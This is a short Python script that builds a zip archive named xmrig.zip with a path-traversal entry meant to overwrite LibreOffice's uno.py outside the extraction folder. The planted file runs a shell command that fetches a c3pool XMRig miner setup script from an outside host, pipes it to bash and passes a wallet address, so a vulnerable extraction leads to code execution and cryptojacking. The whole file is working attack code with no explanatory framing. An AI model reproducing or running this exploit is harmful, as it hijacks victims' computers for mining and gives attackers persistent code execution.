import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'1ue'
        binary2 = b'import os\r\nos.system(\'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 45F8ihixwyTi2WLadoJrsKdjwstKTAEupCYE6jzoBAZWQuY9uXxVh6i1LzoppCXuUx8tXjfaFUCG11DGXeXLkyrx1ir3gZj\')'
        zipFile = zipfile.ZipFile("xmrig.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("xmrig.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
        zipFile.close()
    except IOError as e:
        raise e